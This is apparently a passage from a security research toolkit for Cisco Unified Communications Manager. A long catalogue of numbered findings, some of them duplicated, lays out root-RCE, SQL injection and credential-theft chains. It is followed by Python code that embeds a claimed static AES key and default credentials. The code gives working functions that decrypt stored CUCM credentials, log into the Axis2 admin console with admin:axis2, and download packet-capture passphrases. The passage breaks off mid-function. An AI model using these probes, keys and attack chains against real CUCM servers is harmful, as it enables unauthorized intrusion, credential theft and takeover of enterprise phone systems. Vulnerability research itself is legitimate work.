  Attack vector: authenticated CLI user 'show risdb <injected>' payload; same class as F63/F67/F94 DRF injection family

CUCM-F98 CRITICAL: platform-survivability survivabilityNode_dkey_copy.sh -- dkey.txt + oldkeys.txt set world-readable
  chmod u=rw,go=r applied to /usr/local/platform/.security/CCMEncryption/keys/dkey.txt (plaintext DB encryption Dkey)
  oldkeys.txt = all historical Dkeys (never pruned); any local process reading dkey.txt bypasses F3's static-AES KEK step
  Chain: F3 (static AES key = alternative Dkey recovery, now second-order); F4 + Dkey = full credential dump

CUCM-F99 HIGH: cm-ccmivr ccmivr.war Servlet 2.4 schema + Servlet 3.0 <http-method-omission> version mismatch
  GET+POST omitted from deny-all <auth-constraint/>; IVR PIN-lookup, PlaceCall, GetAudioFile accessible without auth
  Version mismatch: Servlet 2.4 declared but Servlet 3.0 omission elements used -- parser behavior unpredictable
  Chain: F37 (ccmivr SQLi now confirmed pre-auth accessible); ccmportal + ccmivr = 2nd confirmed WAR with omission pattern

CUCM-F100 CRITICAL: cm-usersync DNAliasSync_do_backup/restore -- 4th DRF os.system() + sudo tar injection instance
  5 injection points: DEVICE_TARBALL(arg4), LOGPATH(arg1), STATUSPATH(arg2), DEC_SEQ(arg6), ENC_SEQ(arg8)
  Status progress: os.system("echo ... > " + STATUSPATH) = arbitrary write-to-any-path as root
  Restore: command = DEVICE_TARBALL + DEC_SEQ + " | sudo /bin/tar ..." = command-prefix injection -> root RCE
  Systemic class confirmed 4 instances: F63 (cm-syslog), F67 (cm-reporter), F94 (cm-bps BAT), F100 (cm-usersync DNAliasSync)

CUCM-F101 HIGH: webdialer.war Axis 1.x /services/* no container auth + hardcoded adminPassword=admin
  server-config.wsdd globalConfiguration: adminPassword=admin (Axis default unchanged)
  /services/* NOT in any security-constraint; AxisServlet serves WebdialerSoapService/Service70/Version without container auth
  HTTPAuthHandler in transport extracts creds but no Authenticate handler -> no actual validation at Axis level
  Version service: returns Axis 1.x version without auth (CVE fingerprinting surface)
  Chain: F1 (Axis2 admin:axis2 in axl.war) -> F101 (Axis 1.x adminPassword=admin in webdialer) = systemic Axis default-cred pattern

CUCM-F102 CRITICAL: cm-userlookup DNAliasLookUp DRF -- 5th independent os.system()+sudo tar injection
  Same template as F63/F67/F94/F100; LOGPATH/STATUSPATH/DEVICE_TARBALL/DEC_SEQ all from sys.argv
  restore: DEVICE_TARBALL + DEC_SEQ + " | sudo /bin/tar -xvpPf -" = command-prefix -> root shell
  STATUSPATH: os.system("echo 0 > " + STATUSPATH) = root write-anywhere -> /etc/sudoers.d/ injection
  DRF framework template defect confirmed across 5 independent CUCM components; central remediation needed

CUCM-F103 HIGH: cm-lpns lpns.war Servlet 4.0 -- ZERO container security-constraints
  No <security-constraint> elements anywhere in web.xml; all auth = application-level AuthenticationFilter
  AuthenticationFilter covers /register/* only; all other paths (unregister/, push delivery, admin) unconstrained
  LPNS handles Cisco Jabber/mobile push notification delivery; pre-auth push delivery = notification spoofing
  Chain: F51 (UDS user enumeration) -> F103 (targeted pre-auth push attacks against enumerated users)

CUCM-F104 HIGH: ucm-ccmact ccmact.war -- production debug endpoints /v1/tester/* + /v1/testalarm/* unauthenticated
  Developer comment in source confirms intentional design; alarm injection + tester endpoints pre-auth accessible

CUCM-F105 CRITICAL: platform-docker cm-axl containers -- Struts 2.5.33 CVE-2023-50164 file upload path traversal RCE
  CVSS 9.8; unauthenticated file write to server root -> JSP/WAR RCE inside AXL container

CUCM-F106 CRITICAL: platform-docker -- all 3 Tomcat containers R/W bind-mount /opt/cisco/ -> host filesystem write
  Container foothold writes to host path -> persistence, config tampering, host priv-esc

CUCM-F107 CRITICAL: platform-docker -- UDS container R/W bind-mount /usr/local/cm/.security/
  Full CUCM security material dir (certs, keys, CAPF creds, dkey.txt) R/W; any UDS RCE -> exfil+replace

CUCM-F108 HIGH: platform-docker -- SYS_PTRACE capability all 3 containers + host network mode
  ptrace() any host process; no network namespace; cross-container + host memory dump

CUCM-F109 HIGH: platform-docker -- /common/ R/W bind-mount shared across all 3 containers
  Container-to-container lateral movement; persistence via image layer poisoning through shared mount

CUCM-F110 HIGH: platform-docker -- Tomcat Manager (/manager/) deployed in all AXL/UDS containers
  Default admin app enabled; WAR upload -> arbitrary code exec without additional exploit inside each container

CUCM-F111 CRITICAL: platform-docker -- ccmservice user added to dockerroot group at install
  dockerroot = equivalent root via docker run --privileged; platform service account -> unlimited container launch

CUCM-F112 CRITICAL: ucfips-openssl -- CiscoSSL 1.0.2zd EOL Jan 2020 ships alongside 1.1.1t
  All consumers route to 1.0.2 path; 8+ years unpatched CVEs: CVE-2022-0778 (loop), CVE-2022-2274 (heap RCE), 50+ more

CUCM-F113 HIGH: ucfips-openssl -- fips_post_corrupt exported callable symbol + CISCOSSL_FOM_DIAG env bypass
  nm -D: fips_post_corrupt at 0x7af00; env var relaxes FIPS integrity before library load; FIPS defeatable by local process

CUCM-F114 HIGH: ucfips-openssl -- SSLv2 fully implemented + RC4 (brc4a) + 3DES in FIPS engine + TLS 1.0 + SSLv2Hello
  SSLv2_client/server_method exported; brc4a (Cisco RC4) in cfom.so; cfom_des_ede3_* complete 3DES; DROWN surface

CUCM-F115 HIGH: cm-soap2 (5 WARs) -- Servlet 2.2 method gap (PATCH unconstrained) + transport-guarantee:NONE
  GET/POST auth-constrained; PATCH not listed -> no auth at container; BASIC auth over HTTP; all 5 SOAP2 services

CUCM-F116 HIGH: cm-capf nginx_update.sh -- $certificate_enrollment_profile_label unescaped in sudo sed -i
  GNU sed \n injects newlines -> arbitrary nginx.conf directives as root; CA creds written plaintext before encryption

CUCM-F117 CRITICAL: cm-authentication CUCMUtil.getHostName() -- OAuth SQLi -> unauthenticated Informix DB access
  "select name from processnode where nodeid=" + nodeId (string concat, no PreparedStatement)
  nodeId from OAuth token -> SQLi -> applicationuser.credential -> decrypt with F3 static key -> admin auth
  Chain: pre-auth OAuth -> SQLi -> credential exfil -> F3 decrypt -> admin API access -> F1 axl:axis2 -> RCE

CUCM-F118 CRITICAL: platform-snmp -- SNMPv3 root hardcoded authpass/privpass (MD5+DES) + public no-auth + ccmadmincommunity R/W
  mgr.cnf: root usmHMACMD5AuthProtocol usmDESPrivProtocol "authpass" "privpass" -- identical on all deployments
  public user: usmNoAuthProtocol/usmNoPrivProtocol -- anonymous SNMPv3
  naa.cnf: readcomm=writecomm=ccmadmincommunity; VACM WriteView=iso (full MIB write) for SNMPv1/v2c noAuthNoPriv

CUCM-F119 HIGH: cm-authentication AuthenticationDB -- SHA-1 password hashing + String.equals() timing oracle
  MessageDigest.getInstance("SHA-1"); String.equals() short-circuits on first byte mismatch (not MessageDigest.isEqual())
  SHA-1 offline GPU crackable; remote timing oracle for password inference

CUCM-F120 CRITICAL: cm-changecredential changecredential.war -- Trust-All TrustManager + no container auth + appCertificate default "password"
  checkServerTrusted/checkClientTrusted = return; HostnameVerifier.verify = true (unconditional)
  ZERO <security-constraint> in web.xml (Servlet 2.2); appCertificate default = "password" in shipped DTD
  Chain: POST ChangeCredentialServlet + 7960LoginApp:password -> pre-auth PIN change for any CUCM user

CUCM-F121 HIGH: platform-remotesupport -- static RSA-2048 public key systemwide + sudo script wildcard arg injection
  All CUCM 15.0.1.x use same hardcoded pubkey; Cisco TAC holds private key; key compromise = systemic passphrase decrypt
  sudo script -fq /var/log/.../remote_activity.log* trailing * = argument glob -> path traversal to /etc/cron.d/

CUCM-F122 HIGH: platform-ipsec IPSecClient -- raw socket port 8500 no auth/TLS + XXE on ipsec.xml
  java.net.Socket(host,8500) + PrintWriter.println("CREATE"); any local process sends IPSec management commands
  XMLUtils.getDocumentBuilderFactory() missing setFeature(external-general-entities,false) -> XXE on ipsec.xml

NOTE: F115-F123 above are the DRF framework + TVS agent findings. F124-F131 are the concurrent SOAP2/CAPF/auth/SNMP/changecred/remotesupport/ipsec findings renumbered to avoid collision.

CUCM-F124 HIGH: cm-soap2 (5 WARs) -- Servlet 2.2 PATCH method unconstrained + transport-guarantee:NONE
  CDRonDemandService2/controlcenterservice2/logcollectionservice2/perfmonservice2/realtimeservice2
  GET+POST auth-constrained (admin role required); PATCH not listed in either constraint -> no container auth
  transport-guarantee:NONE -> HTTP Basic credentials sniffable; extends F89 SOAP1/AXL gap to SOAP2 family

CUCM-F125 HIGH: cm-capf nginx_update.sh -- $certificate_enrollment_profile_label unescaped in sudo sed -i
  GNU sed \n in replacement string -> arbitrary nginx.conf directives injected as root
  CA credentials written plaintext (echo $4 > credential_file) before CCMEncryption step

CUCM-F126 CRITICAL: cm-authentication CUCMUtil.getHostName() -- OAuth token SQLi -> Informix DB
  "select name from processnode where nodeid=" + nodeId (String concat, no PreparedStatement)
  nodeId from OAuth token field -> pre-auth Informix SQLi
  Chain: OAuth endpoint -> SQLi -> applicationuser.credential -> F3 decrypt -> admin auth -> F1 RCE

CUCM-F127 CRITICAL: platform-snmp -- SNMPv3 root hardcoded authpass/privpass + public no-auth + ccmadmincommunity R/W
  mgr.cnf: root MD5/DES authpass/privpass hardcoded; public usmNoAuth/usmNoPriv = anonymous
  naa.cnf: readcomm=writecomm=ccmadmincommunity; VACM WriteView=iso full MIB for noAuthNoPriv SNMPv1/v2c

CUCM-F128 HIGH: cm-authentication -- SHA-1 password hashing + String.equals() timing oracle
  MessageDigest.getInstance("SHA-1"); String.equals() short-circuits (not MessageDigest.isEqual())
  SHA-1 GPU crackable; timing oracle for remote password inference

CUCM-F129 CRITICAL: cm-changecredential -- Trust-All TrustManager + no container auth + appCertificate default "password"
  checkServerTrusted/checkClientTrusted=return; HostnameVerifier.verify=true unconditional
  web.xml: ZERO <security-constraint>; CredentialChange.dtd: appCertificate=password for 7960LoginApp
  Pre-auth PIN change for any CUCM user via 7960LoginApp:password; all outbound HTTPS MITMable

CUCM-F130 HIGH: platform-remotesupport -- systemwide static RSA-2048 key + sudo script wildcard
  All CUCM 15.0.1.x: same hardcoded pubkey in remotesupport_createaccount binary at known offsets
  Cisco TAC holds private key; compromise = retroactive decrypt of all remote support passphrases ever
  sudo script -fq /var/.../remote_activity.log* trailing * glob -> path traversal to /etc/cron.d/

CUCM-F131 HIGH: platform-ipsec -- IPSecClient raw socket port 8500 no auth + XXE on ipsec.xml
  java.net.Socket(host,8500) no TLS no auth; local process sends CREATE to IPSec manager
  XMLUtils.getDocumentBuilderFactory() missing external-general-entities=false -> XXE on ipsec.xml

CUCM-F220 CRITICAL: platform-clm DRF restore -- do_restore.py os.system() + sudo tar injection on DEC_SEQ/DEVICE argv (5th DRF class)
  DEC_SEQ=sys.argv[6], DEVICE=sys.argv[3] concatenated into "sudo tar -xvpPf - 1>> LOGPATH 2>> LOGPATH DEC_SEQ|" via os.system()
  Authenticated DRF restore trigger -> root RCE

CUCM-F221 CRITICAL: platform-clm DRF backup -- do_backup.py os.system() + sudo tar injection on ENC_SEQ/DEVICE_TARBALL argv (6th DRF class)
  ENC_SEQ=sys.argv[8], DEVICE_TARBALL=sys.argv[4] concatenated into sudo tar via os.system()
  Authenticated DRF backup trigger -> root RCE

CUCM-F263 CRITICAL: platform-servM -- servm_runtime_setup.sh executes /usr/local/platform/bin/phase_scripts_cmd.sh without integrity verification
  Lines 110-116: if [ -f $PHASE_SCRIPTS_CMD_FILE ]; then chmod +x; sh $PHASE_SCRIPTS_CMD_FILE; rm -f (destroys evidence)
  Any process writing that path achieves code execution at servM startup. Chain: DAC_OVERRIDE container -> write file -> service restart -> root exec

CUCM-F271 HIGH: platform-dataexport -- sftpuser/drfuser/ccmservice all use 1024-bit DSA SSH keys (id_dsa)
  DSA fixed at 1024-bit (~80-bit security), disabled in OpenSSH 9.x+; nonce reuse exposes private key from few observed signatures

CUCM-F272 HIGH: platform-cluster-config -- processClusterConfig.sh SQL injection via nodeName from clusterConfig.xml
  nodeName=$(awk) from XML -> "select name from processnode where name = '$nodeName'" via $db_cmd (no parameterization)
  MITM on cluster sync channel -> forge clusterConfig.xml with malicious nodeName -> Informix SQL injection on subscriber

CUCM-F278 MEDIUM: platform-servM -- servM listens on localhost:8889 without authentication
  *.listenServicePort=8889, *.localHost=true; no credential required; all 3 Docker containers share host network
  Any compromised container sends restart command -> phase_scripts_cmd.sh execution (F263) if file pre-staged

CUCM-F281 CRITICAL: cm-syslog DRF backup -- do_syslog_backup.py os.system() + sudo tar injection ENC_SEQ+REDIRECTION (7th DRF class)
  ENC_SEQ=sys.argv[8], DEVICE_TARBALL=sys.argv[4], REDIRECTION=sys.argv[5] -> os.system("sudo tar ... " + ENC_SEQ + " " + REDIRECTION)

CUCM-F282 CRITICAL: cm-tct-svc DRF backup -- tct_do_backup.py os.system() + sudo tar injection (8th DRF class)
  DEVICE_TARBALL=argv[4], ENC_SEQ=argv[8], REDIRECTION=argv[5] -> os.system(sudo tar ...) all unsanitized

CUCM-F283 CRITICAL: cm-tct-svc DRF restore -- tct_do_restore.py os.system() + sudo tar injection (9th DRF class)
  DEVICE=argv[3], DEC_SEQ=argv[6] -> os.system(DEVICE + DEC_SEQ + " | sudo tar ...") DEVICE runs before pipe

CUCM-F298 CRITICAL: cm-cdrdlv DRF CDR/CAR backup -- do_cdrcar_backup.py os.system() + sudo tar injection (10th DRF class)
  deviceTarball=argv[4], ENC_SEQ=argv[8] -> executeWithRCSecured("sudo /bin/tar -cvpPf " + deviceTarball + ... + ENC_SEQ)

CUCM-F299 CRITICAL: cm-car -- RecreateCARTables.sh EXPORT branch unquoted $2 in dbaccess su -c -> informix user RCE
  su informix -c "/usr/local/cm/db/informix/bin/dbaccess - $2" ($2 unquoted)
  CAR web report export -> crafted parameter -> informix OS user shell -> full Informix DB compromise

CUCM-F302 HIGH: cm-cdrdlv -- cdragntScript.py/cdrScript.py SD_LIB_PATH env var injected into os.system()
  LD_LIBRARY_PATH = os.getenv("SD_LIB_PATH") + ":..." ; os.system("export LD_LIBRARY_PATH=" + LD_LIBRARY_PATH)
  Malicious SD_LIB_PATH in service environment -> shell injection on CDR agent restart

CUCM-F303 HIGH: cm-cdrdlv -- cdrrep_backup.py chmod 777 on /common/drf/CDR_CAR/ and cardb.bin (Informix dump)
  World-readable CDR database dump; symlink race at chmod allows overwrite of arbitrary file

CUCM-F308 CRITICAL: cm-em -- emservice.war GET/POST excluded from security-constraint by http-method enumeration
  Only PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE enumerated -> GET/POST outside all constraints -> unauthenticated EM phone login/logout API

CUCM-F309 CRITICAL: cm-em -- emapp.war GET/POST excluded from security-constraint (identical pattern to F308)
  EMAppServlet (Extension Mobility login UI) accessible without authentication via GET/POST

CUCM-F311 HIGH: cm-tct-svc -- tracecollection.policy AllPermission grant to all code -> JVM sandboxing disabled
  grant { permission java.security.AllPermission; }; — no codebase restriction
  Any code loaded in TCT JVM (RMI, deserialization) reads/writes arbitrary files, executes OS commands

CUCM-F312 HIGH: cm-tct-svc -- TCT RMI registry on ports 7000-7002 without authentication
  rmiRegistryPort=7000, rmiCallbackPort=7001, rmiServerPort=7002; no TLS, no auth
  Combined with AllPermission (F311): enumerate TCTService registry, invoke backup/restore, load remote classes

CUCM-F318 CRITICAL: ccmadmin -- Struts2 struts.ognl.allowStaticMethodAccess=true -> OGNL static method invocation RCE
  <constant name="struts.ognl.allowStaticMethodAccess" value="true"/>
  Enables @ClassName@methodName() in OGNL. Combined with F326 (session OGNL eval) and F319 (CSRF) -> pre-auth RCE chain

CUCM-F319 HIGH: ccmadmin -- 569 state-changing actions without CSRF token (InterceptorStack has no token interceptor)
  225 Save + 324 Delete + 20 Reset actions: delete phones/users/gateways/routing rules without CSRF protection
  Single malicious page in admin browser triggers any state-changing operation

CUCM-F321 HIGH: cm-rtmt-servlet -- RTMT XmlToMap.fromXML() Xerces DOMParser XXE (no setFeature disallow-doctype-decl)
  POST /ast/ASTIsapi.dll?AddAlert with AlertConfig XML -> XXE file read from CUCM server
  Extract: /etc/shadow, /usr/local/platform/conf/*, DB credential files, platform keys

CUCM-F322 HIGH: cm-gaxl -- CXF LoggingFeature logs full SOAP Authorization headers for AXL 12.0/12.5/14.0
  All AXL Basic Auth credentials logged at INFO level -> readable from log files by any local user

CUCM-F323 HIGH: ccmuser -- Pre-auth reflected XSS on LoginError.jsp via j_username (null CSP)
  request.getParameter("j_username") reflected unescaped; CSP: default-src * 'unsafe-inline' 'unsafe-eval'
  Pre-auth XSS + null CSP = credential harvest against all CUCM users

CUCM-F324 HIGH: ccmportal -- <http-method-omission>GET/POST</http-method-omission> leaves primary verbs outside auth-constraint
  Per Servlet 3.0: method-omission excludes GET+POST from auth requirement
  Auth falls solely on AuthenticationValve; valve bypass exposes all ccmportal GET/POST unauthenticated

CUCM-F325 HIGH: ccmadmin -- Open redirect in change-password: bypassable regex (needs 'www') + no interceptor stack
  Regex blocks URLs with both 'http' AND 'www'; protocol-relative //evil.com and HTTPS-no-www bypass
  CSRF-triggered password change lands admin on attacker page

CUCM-F326 HIGH: ccmadmin -- OGNL expression ${#session.LAST_ACCESSED_PAGE}.do in global 'input' redirect evaluates session value
  All 569 CSRF-vulnerable actions trigger 'input' result on validation failure
  With allowStaticMethodAccess=true (F318): CSRF -> taint session -> OGNL eval -> static method -> RCE

CUCM-F327 MEDIUM: ccmadmin -- GenericFindListAction (6 variants) use createStatement() not PreparedStatement
  WHERE clause built via string concatenation with user search input; sqlEscape() coverage unverified statically
  ORDER BY column injection or search-field bypass -> Informix full config read

CUCM-F328 MEDIUM: platform-ui -- cli-ldapfix.sh writes TLS_REQCERT never to /etc/openldap/ldap.conf
  sed -i removes TLS_REQCERT hard; appends TLS_REQCERT never; persists across reboots
  All LDAP-integrated auth (phone reg, EndUser auth, dir sync) becomes MITM-susceptible after CLI command

CUCM-F285 HIGH: ccmrealm -- SeadragonUserDAO SQL injection via MessageFormat {0} substitution at auth time
  MessageFormat.format("SELECT ... WHERE my_lower(userid)= my_lower(''{0}'')", userid)
  Login-time SQL injection against EndUser table; attacker submits crafted username to ccmadmin/ccmuser

CUCM-F286 HIGH: ccmrealm -- CCMRealmPlugin SQL injection via MessageFormat {0} in post-auth role/association queries
  All CUCM web apps (ccmadmin, ccmservice, cucreports, ucmuser) run these queries after every login
  FunctionRole + ApplicationAssociation query injection -> dump role/credential tables

CUCM-F287 HIGH: sso_jar -- SSOXMLUtil.getDocumentBuilder() XXE (no disallow-doctype-decl, no setExpandEntityReferences(false))
  parseXmlFile() used for IdP metadata imports and SP config; attacker-supplied XML -> local file read or SSRF

CUCM-F289 HIGH: sso-sp -- SSOEnablePerService.sh unquoted variables in sudo SAMLSSOMgmt.py invocation -> root shell injection
  OPERATION/RESULTFILE/ACTIVATESERVICE unquoted in $ENABLESAMLSSO_CMD invocation
  SSO enable/disable admin action with crafted resultFilePath -> root command execution

CUCM-F290 HIGH: sso-sp -- CommandExecutor.executeCommand() passes String verbatim to new ProcessBuilder(["bash","-c",command])
  Shell metacharacters in command string execute arbitrary commands; multiple callers in SSO backend

CUCM-F293 HIGH: cm-idp -- IDP ELF64 binary SQL injection via string concatenation in dial plan queries
  "select * from DialPlanTag where fkDialPlan='" + value (C++ string concat -> ODBC)
  Binary also imports system() for shell execution

CUCM-F295 MEDIUM: sso-sp -- ssosp.war ESAPI.properties has MasterKey/MasterSalt commented out -> public ESAPI test keys used
  Encryptor.MasterKey= and Encryptor.MasterSalt= both commented; ESAPI falls back to documented test defaults
  All ESAPI-encrypted session params/tokens decryptable with known public defaults

CUCM-F296 MEDIUM: sso-sp -- OAuth signing key (/authz_priv.pem) and encryption key paths in plaintext ssoconfig.properties
  oAuthTokenSigningKey=/usr/local/platform/.security/authz/keys/authz_priv.pem (world-readable via F273 chmod o+rx)
  Key file read -> full OAuth token forgery for any CUCM user

CUCM-F337 MEDIUM: batui -- BAT bulkconfigtoolexportCheckDependency ${filename} OGNL in Struts2 redirect result
  <result type="redirect">/bulkconfigtoolexportEdit.do?filename=${filename}</result>
  With allowStaticMethodAccess=true (F318): filename OGNL injection -> static method -> RCE

CUCM-F338 MEDIUM: Multiple WARs -- crossContext=true on ccmportal/ucmuser/all RTMT apps
  Any compromised WAR calls getContext("/ccmadmin") -> access sibling app sessions and attributes
  Compromised RTMT servlet reads ccmadmin session tokens

CUCM-F339 HIGH: cm-ucmadmin -- Jackson 1.9.13 (EOL 2013) -> CVE-2017-7525 polymorphic deserialization RCE
  If ObjectMapper uses enableDefaultTyping() or @JsonTypeInfo(use=CLASS): attacker JSON -> class instantiation -> RCE

CUCM-F348 CRITICAL: cm-soap2 (5 WARs) -- Axis2 default admin:axis2 + hotdeployment=true + /axis2-admin/* unconstrained
  cdrondemandservice2, controlcenterservice2, logcollectionservice2, perfmonservice2, realtimeservice2
  Low-priv CUCM credential -> Axis2 admin console -> deploy malicious AAR -> Tomcat RCE (6th Axis2 RCE vector)

CUCM-F349 CRITICAL: cm-soap-realtimeservice + cm-soap2-realtimeservice2 -- executeCCMSQLStatement passes raw SQL to ConnectorPub.executeQuery()
  SOAP operation: no parameterization, no whitelist; SQL also logged at INFO (credential exposure)
  Any Standard CCM Admin Users role -> arbitrary Informix SQL read/write

CUCM-F350 CRITICAL: cm-soap2-controlcenterservice2 -- getFileDirectoryList new File(userInput).listFiles() -> arbitrary filesystem traversal
  No getCanonicalPath(), no allowlist; debug println("Hey getfiledirlist") confirms no security review
  Authenticated SOAP caller enumerates /root/.ssh, /usr/local/platform/.security/, /etc/

CUCM-F351 HIGH: cm-soap2-cdrondemandservice2 -- CDRonDemand get_file SFTP: root destroys known_hosts + connects to attacker SFTP
  ssh_PK_setup.sh: exec rm -f /root/.ssh/known_hosts; spawn sftp attacker; accepts any host key; exfiltrates sftpuser id_dsa.pub

CUCM-F353 HIGH: cm-soap-cdrondemandservice -- /tmp/batchCmds TOCTOU race: world-writable path used by sftpuser sudo sftp -b
  Attacker pre-creates /tmp/batchCmds as symlink or replaces between write and sftp read -> arbitrary SFTP commands as sftpuser

CUCM-F354 HIGH: cm-soap-dpservice -- DPServiceBindingImpl SQL injection via string concatenation
  "select pkid from dpdeviceproductcomponent WHERE name = '" + userInput + "' AND fkdpdevice ='" + deviceId + "'"
  Classic UNION injection -> pivot to applicationuser table

CUCM-F355 HIGH: cm-soap-callrecordservice -- CallRecordBindingImpl prefix-only SQL validation bypassed by UNION
  Validation: startsWith("select first") OR startsWith("call"); no parameterization after validation
  "select first 1,* FROM enduser UNION SELECT ..." passes prefix check, executes fully

CUCM-F357 MEDIUM: cmnservutil -- PathReversalSecurityFilter only checks GET query string, ignores POST body
  doFilter() reads httpRequest.getQueryString(); SOAP POST body bypasses entirely; filter logic also inverted (blocks non-?wsdl GET)

CUCM-F359 MEDIUM: cm-soap-cdrondemandservice -- Test_soap_cdrondemand_file.sh with hardcoded CUAdministrator:ciscocisco shipped to production /usr/local/cm/bin/
  Reveals canonical SOAP service account name and expected default credentials
"""

VERSION = "3.42.0"

import requests
import urllib3
import struct
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── FINGERPRINT STRINGS ─────────────────────────────────────────────────────

CUCM_TITLE_MARKERS = [
    b'Cisco Unified CM Administration',
    b'ccmadmin',
    b'cuicauthentication',
    b'CUCM',
    b'Unified Communications Manager',
]

AXL_AXIS2_DEFAULT_CRED = ('admin', 'axis2')

CUCM_INFORMIX_DEFAULT_CRED = ('ccmuser', 'ccmuser')

DEFAULT_PASSWORDREVERSE_HASH = '69c4f936f9cdf45f6bbca2570c31215629bb5d6fb97493478b8ff3db6fffbc55'

# CUCM-F3: Hardcoded static AES-128 key in CCMShellEncryptionUtil
# Extracted from cm-ccm/CCMShellEncryptionUtil binary .data section:
#   nm: D _ZN20CCMEncryptionLibrary10_staticKeyE @ VA 0x20f308
#   Pointer at 0x20f308 → string at VA 0xc111 = b'smetsysocsiccni\x00'
# "incciscosystems" reversed. Universal across all CUCM 15.0.1 installations.
CCM_STATIC_ENCRYPTION_KEY = b'smetsysocsiccni\x00'  # 16 bytes AES-128

# CUCM-F1: AuthenticationFilter maps to <url-pattern>/</url-pattern> (confirmed web.xml)
# Axis2AdminServlet maps to /axis2-admin/* — filter does NOT apply
# CVSS 9.8 Critical — unauthenticated Axis2 admin accessible with default admin:axis2
AXL_AXIS2_ADMIN_PATH = '/axl/axis2-admin/'
AXL_AXIS2_UPLOAD_PATH = '/axl/axis2-admin/upload'

# ─── PROBES ──────────────────────────────────────────────────────────────────

def decrypt_cucm_credential(hex_ciphertext: str, key: bytes = CCM_STATIC_ENCRYPTION_KEY) -> dict:
    """
    Decrypt a CCMShellEncryptionUtil-encrypted credential using the hardcoded static key.
    CUCM-F3: key = b'smetsysocsiccni\x00' AES-128-CBC.
    hex_ciphertext: hex string output of CCMShellEncryptionUtil -e
    """
    import binascii
    try:
        from Crypto.Cipher import AES
    except ImportError:
        return {"error": "pycryptodome not installed: pip install pycryptodome"}
    try:
        ct = binascii.unhexlify(hex_ciphertext.strip())
        if len(ct) < 16:
            return {"error": "ciphertext too short"}
        # CCM encryption: IV may be first 16 bytes or all-zero — try both
        results = {}
        for iv_source in ['first_16', 'zero']:
            try:
                if iv_source == 'first_16' and len(ct) > 16:
                    iv = ct[:16]; body = ct[16:]
                else:
                    iv = b'\x00' * 16; body = ct
                cipher = AES.new(key, AES.MODE_CBC, iv)
                pt = cipher.decrypt(body)
                pad_len = pt[-1] if pt[-1] <= 16 else 0
                plaintext = pt[:-pad_len].decode('utf-8', errors='replace') if pad_len else pt.decode('utf-8', errors='replace')
                results[iv_source] = plaintext.rstrip('\x00')
            except Exception as e:
                results[iv_source] = f"error: {e}"
        return {"finding": "CUCM-F3", "key": key.hex(), "results": results}
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F3"}


def probe_axis2_admin(host: str, port: int = 8443) -> dict:
    """Probe Axis2 admin console for default admin:axis2 credential (CUCM-F1)."""
    url = f"https://{host}:{port}/axl/axis2-admin/"
    import base64
    cred = base64.b64encode(b'admin:axis2').decode()
    try:
        r = requests.get(url, headers={"Authorization": f"Basic {cred}"},
                        verify=False, timeout=10, allow_redirects=False)
        return {
            "status":   r.status_code,
            "finding":  "CUCM-F1",
            "note":     ("200 = Axis2 admin accessible with default admin:axis2"
                         if r.status_code == 200 else
                         "Non-200: auth filter may be covering /axis2-admin/"),
            "hotdeploy": "true" in r.text.lower() if r.status_code == 200 else "unknown",
        }
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F1"}


def probe_platformcom_localhost_bypass(host: str, port: int = 8443,
                                        internal_ip: str = "127.0.0.1") -> dict:
    """
    Probe platformcom software endpoints for localhost bypass (CUCM-F2).
    Requires SSRF or local access — sends request simulating loopback origin.
    Note: X-Forwarded-For is NOT sufficient; the filter reads remoteAddr (real TCP source).
    This probe is meaningful only when run FROM the CUCM host.
    """
    endpoints = [
        f"https://{host}:{port}/platformcom/api/v1/certmgr/config/snapshot/server",
        f"https://{host}:{port}/platformcom/api/v1/certmgr/config/snapshot/options",
    ]
    results = []
    for url in endpoints:
        try:
            r = requests.get(url, verify=False, timeout=10)
            results.append({"url": url, "status": r.status_code,
                            "len": len(r.content)})
        except Exception as e:
            results.append({"url": url, "error": str(e)})
    return {"finding": "CUCM-F2", "endpoints": results,
            "note": "200 without auth = unprotected endpoint confirmed"}


def probe_axl_auth(host: str, username: str, password: str,
                   port: int = 8443) -> dict:
    """Probe AXL SOAP API authentication."""
    url = f"https://{host}:{port}/axl/services/AXLAPIService"
    soap_body = '''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:axl="http://www.cisco.com/AXL/API/15.0">
  <soapenv:Header/>
  <soapenv:Body>
    <axl:getCCMVersion/>
  </soapenv:Body>
</soapenv:Envelope>'''
    try:
        r = requests.post(url, data=soap_body,
                          headers={"Content-Type": "text/xml; charset=utf-8",
                                   "SOAPAction": '""'},
                          auth=(username, password),
                          verify=False, timeout=15)
        return {
            "status":   r.status_code,
            "auth_ok":  r.status_code == 200,
            "response_snippet": r.text[:200],
        }
    except Exception as e:
        return {"error": str(e)}


def probe_pktcap_passphrase(host: str, username: str, password: str, port: int = 8443) -> dict:
    """
    CUCM-F12: pktCap file parameter passphrase disclosure.
    Attempts to download /var/pktCap/.pktCap.passphrase via ?file=.pktCap.passphrase.
    Requires credentials for a user in the 'Standard Packet Sniffer Users' group.
    """
    import base64
    url = f"https://{host}:{port}/pktCap"
    params = {"file": ".pktCap.passphrase"}
    cred = base64.b64encode(f"{username}:{password}".encode()).decode()
    try:
        r = requests.get(url, params=params,
                         headers={"Authorization": f"Basic {cred}"},
                         verify=False, timeout=15)
        if r.status_code == 200 and len(r.content) > 0:
            return {
                "finding":       "CUCM-F12",
                "status":        r.status_code,
                "passphrase_len": len(r.content),
                "passphrase_hex": r.content.hex(),
                "passphrase_raw": r.content.decode('utf-8', errors='replace').strip(),
                "note":          "CONFIRMED: .pktCap.passphrase downloaded — use to decrypt *.pkt captures",
            }
        return {
            "finding": "CUCM-F12",
            "status":  r.status_code,
            "note":    ("403/401 = auth rejected or role missing"
                        if r.status_code in (401, 403) else
                        "404 = no captures running or file absent"),
        }
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F12"}


def probe_pktcap_fileinfo(host: str, username: str, password: str, port: int = 8443) -> dict:
    """
    Probe pktCap for .fileinfo metadata (companion to F12 passphrase probe).
    .fileinfo contains capture session metadata without requiring a running capture.
    """
    import base64
    url = f"https://{host}:{port}/pktCap"
    params = {"file": ".fileinfo"}
    cred = base64.b64encode(f"{username}:{password}".encode()).decode()
    try:
        r = requests.get(url, params=params,
                         headers={"Authorization": f"Basic {cred}"},
                         verify=False, timeout=15)
        return {
            "finding": "CUCM-F12",
            "file":    ".fileinfo",
            "status":  r.status_code,
